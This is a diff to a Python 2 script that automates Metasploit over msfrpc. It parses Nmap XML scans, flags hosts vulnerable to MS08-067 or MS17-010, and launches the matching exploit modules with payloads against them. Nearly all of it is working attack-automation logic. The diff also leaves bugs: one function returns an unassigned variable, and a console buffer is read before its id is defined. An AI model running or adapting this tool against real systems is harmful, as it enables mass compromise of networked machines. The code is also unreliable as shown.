@@ -23,7 +23,6 @@ def parse_args():
     parser.add_argument("-p", "--password", default='Au70PwN', help="Password for msfrpc")
     parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
     parser.add_argument("-x", "--xml", help="Nmap XML file")
-    parser.add_argument("--port", default=55552, type=int, help="Port for msfrpc")
     return parser.parse_args()
 
 # Colored terminal output
@@ -144,7 +143,7 @@ def get_hosts(report):
                 nmap_os = str(nmap_os_raw[0]).split(':')[1].split('\r\n')[0].strip()
             else:
                 # Default to Windows
-                nmap_os = 'Windows'
+                nmap_os = '?'
 
             print_info('{} - {}'.format(ip, nmap_os))
             for s in host.services:
@@ -157,6 +156,7 @@ def get_hosts(report):
                         banner = s.banner.split('product: ')[1]
                     else:
                         banner = s.banner
+
                     port = str(s.port)
                     print '          {} - {}'.format(port, banner)
 
@@ -193,7 +193,6 @@ def check_named_pipes(c_id, ip, nmap_os):
         delim = 'Pipes: '
         if delim in l:
             pipes = l.split(delim)[1].split(', ')
-            print pipes #1111
 
     return pipes
 
@@ -233,6 +232,7 @@ def create_msf_cmd(module_path, rhost_var, ip, port, payload, extra_opts):
     ExitOnSession True; even if we use aux module this just won't do anything
     '''
     local_ip = get_local_ip(get_iface())
+    print_info('Executing {}'.format(module_path))
     cmds = """
            use {}\n
            set {} {}\n
@@ -250,14 +250,11 @@ def get_module_output(c_id, cmd):
     '''
     Runs module and gets output
     '''
-    #wait_on_busy_console(c_id)
-    #clear console output buffer
-    #print CLIENT.call('console.read', [c_id])
     CLIENT.call('console.write',[c_id, cmd])
-    wait_on_busy_console(c_id)
-    output = CLIENT.call('console.read', [c_id])['data'].splitlines()
+    time.sleep(3)
+    mod_output = wait_on_busy_console(c_id)
 
-    return output
+    return mod_output
 
 def get_payload(module, nmap_os):
     '''
@@ -306,7 +303,6 @@ def get_payload(module, nmap_os):
 
     return payload
 
-
 def check_nse_vuln_scripts(host, script):
     '''
     Check if host if vulnerable via nse script
@@ -328,14 +324,14 @@ def run_exploits(c_id, host):
     ms08_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms08-067')
     ms17_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms17-010')
     if ms08_vuln == True:
-        output = run_ms08(c_id, host)
+        mod_output = run_ms08(c_id, host)
     if ms17_vuln == True:
-        output = run_ms17(c_id, host)
+        mod_output = run_ms17(c_id, host)
 
-def print_module_output(output, module):
-    print_info('{} output:'.format(module))
-    for l in output:
-        print '    '+l.strip()
+#def print_module_output(output, module):
+#    print_info('{} output:'.format(module))
+#    for l in output:
+#        print '    '+l.strip()
 
 def run_ms08(c_id, host):
     '''
@@ -349,8 +345,7 @@ def run_ms08(c_id, host):
     ms08_opts = ''
     ms08_payload = get_payload(ms08_path, nmap_os)
     ms08_cmd = create_msf_cmd(ms08_path, ms08_rhost_var, ip, port, ms08_payload, ms08_opts)
-    output = get_module_output(c_id, ms08_cmd)
-    print_module_output(output, ms08_path)
+    mod_output = get_module_output(c_id, ms08_cmd)
 
     return output
 
@@ -366,6 +361,7 @@ def run_ms17(c_id, host):
     # If we find one, then use Romance/Synergy instead of Blue
     named_pipe = None
     named_pipes = check_named_pipes(c_id, ip, nmap_os)
+
     # Just use the first named pipe
     if named_pipes:
         named_pipe = named_pipes[0]
@@ -382,10 +378,9 @@ def run_ms17(c_id, host):
     ms17_payload = get_payload(ms17_path, nmap_os)
 
     ms17_cmd = create_msf_cmd(ms17_path, ms17_rhost_var, ip, port, ms17_payload, ms17_opts)
+    mod_output = get_module_output(c_id, ms17_cmd)
 
-    output = get_module_output(c_id, ms17_cmd)
-    print_module_output(output, ms17_path)
-    return output
+    return mod_output
 
 def wait_on_busy_console(c_id):
     '''
@@ -395,9 +390,24 @@ def wait_on_busy_console(c_id):
     so this ridiculous list comprehension seems necessary to avoid assuming
     what the right list offset might be
     '''
+    output = []
     list_offset = int([x['id'] for x in CLIENT.call('console.list')['consoles'] if x['id'] is c_id][0])
     while CLIENT.call('console.list')['consoles'][list_offset]['busy'] == True:
+        cur_output = CLIENT.call('console.read', [c_id])['data'].splitlines()
+        for l in cur_output:
+            l = l.strip()
+            output.append(l)
+            print '    '+l.strip()
         time.sleep(1)
+
+    # Get remaining output
+    cur_output = CLIENT.call('console.read', [c_id])['data'].splitlines()
+    for l in cur_output:
+        l = l.strip()
+        output.append(l)
+        print '    '+l.strip()
+
+    return output
 
 def main(report, args):
     global CLIENT
@@ -421,12 +431,15 @@ def main(report, args):
     if len(c_ids) == 0:
         CLIENT.call('console.create')
         c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]
+        # Clear output buffer
+        CLIENT.call('console.read', [c_id])['data'].splitlines()
 
     # Get the latest console
     c_id = c_ids[-1]
 
     for host in hosts:
         run_exploits(c_id, host)
+        remainder_output = wait_on_busy_console(c_id)
 
 if __name__ == "__main__":
     args = parse_args()
